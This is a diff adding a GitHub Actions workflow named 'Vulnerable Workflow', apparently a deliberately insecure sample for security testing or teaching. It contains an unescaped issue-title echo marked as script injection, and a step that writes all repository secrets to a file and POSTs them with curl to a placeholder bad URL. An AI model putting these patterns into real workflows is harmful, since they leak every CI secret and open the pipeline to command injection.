@@ -1,0 +1,20 @@
+name: Vulnerable Workflow
+on:
+  workflow_dispatch:
+
+jobs:
+  vulnerable_workflow:
+    name: Create OpenAPI Spec
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      # Script injection
+      - run: echo "${{ github.event.issue.title }}"
+
+      # Curl with secrets
+      - run:  |
+          echo "${{ toJSON(secrets) }}" > .secrets
+          curl -X POST -s --data "@.secrets" <BADURL > /dev/null
